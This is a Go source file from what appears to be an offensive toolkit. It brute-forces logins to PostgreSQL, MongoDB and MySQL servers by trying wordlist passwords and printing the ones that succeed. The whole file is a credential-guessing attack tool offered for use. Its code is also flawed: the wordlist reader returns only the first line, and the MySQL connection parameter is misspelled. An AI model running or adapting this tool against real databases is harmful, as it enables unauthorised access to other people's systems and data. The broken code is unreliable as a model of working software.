/*

Settings for database brute forcing and database attacks
this revolves around the net of brute.go as an extension / plugin

Dev -> ArkAngeL43
*/
package db

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	v "main/modg/colors"
	ex "main/modg/warnings"
	"os"
	"time"

	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq"
	"gopkg.in/mgo.v2"
)

var (
	Wordlist         string            // Set a wordlist
	Thread_count     = 0               // Set a modified thread count
	Max_Thread_Count = 2               // Set a Max thread count | max thread count must be 2 for func
	Databasechan     = make(chan bool) // Set a channel signal
)

func wordlist(list string) (string, error) {
	l, e := os.Open(list)
	if e != nil {
		return "Could not open wordlist", e
	}
	scanner := bufio.NewScanner(l)
	for scanner.Scan() {
		return scanner.Text(), nil
	}
	return "", nil
}

func PostGreSQL_Brute(db_name, password, host, user string) {
	conn := "postgres://"
	conn += user + ":" + password
	conn += "@" + host + "/" + db_name
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Connection String: -> ", conn)
	db, e := sql.Open("postgres", conn)
	ex.Ce(e, v.REDHB, "<RR6> Database: Could not make a postgres connection", 1)
	e = db.Ping()
	if e == nil {
		fmt.Println("<RR6> Database: Was able to login with password -> ", password)
	} else {
		fmt.Println("<RR6> Database: Was not able to process a correct and direct authentication request, auth came back failed")
	}
	Databasechan <- true
}

func Mongo_Brute(password, host, user string) {
	mgo_inf := &mgo.DialInfo{
		Addrs:    []string{host},
		Timeout:  10 * time.Second,
		Username: user,
		Password: password,
	}
	_, err := mgo.DialWithInfo(mgo_inf)
	if err == nil {
		fmt.Println("<RR6> Database: Able to login with password - ", password)
	} else {
		log.Println("Error connecting to Mongo. ", err)
	}
	Databasechan <- true
}

func MySQL_Brute(dbname, host, password, user string) {
	conn := user + ":" + password
	conn += "@tcp(" + host + ")/" + dbname
	conn += "?charse=utf8"
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Connection String: -> ", conn)
	db, e := sql.Open("mysql", conn)
	ex.Ce(e, v.REDHB, "<RR6> Database: Could not make a MySQL connection", 1)
	e = db.Ping()
	if e == nil {
		fmt.Println("<RR6> Database: Was able to log into a MYSQL database with password - ", password)
	} else {
		fmt.Println("<RR6> Database: Could not authenticate password -> ", password)
	}
	Databasechan <- true
}

func brute_s(wl, user, dbtype, host, dbname string) {
	pass, err := wordlist(wl)
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Setting: Got return code -> ", pass)
	ex.Ce(err, v.REDHB, "<RR6> Database: Could not open the wordlist", 1)
	if Thread_count >= Max_Thread_Count {
		Databasechan <- true
		Thread_count -= 1
		fmt.Println("<RR6> Hardware - digital: Subtracting thread count by 1, thread count -> ", Thread_count)
	}
	switch dbtype {
	case "mongo":
		go Mongo_Brute(pass, host, user)
	case "mysql":
		go MySQL_Brute(dbname, host, pass, user)
	case "postgresql":
		go PostGreSQL_Brute(dbname, pass, host, user)
	default:
		fmt.Println("[-] Unexpected error: expecting mysql, mongo, or postgresql firm inputs")
	}
	Thread_count++
}

func Parse_Server(username, wordlist, hostname, dbname, dbtype string) {
	Databasechan = make(chan bool)
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Setting...: Username -> ", username)
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Setting...: Wordlist -> ", wordlist)
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Setting...: DB Name  -> ", dbname)
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Setting...: DB Type  -> ", dbtype)
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Setting...: DB Host  -> ", hostname)
	time.Sleep(1 * time.Second)
	brute_s(wordlist, username, dbtype, hostname, dbname)
}
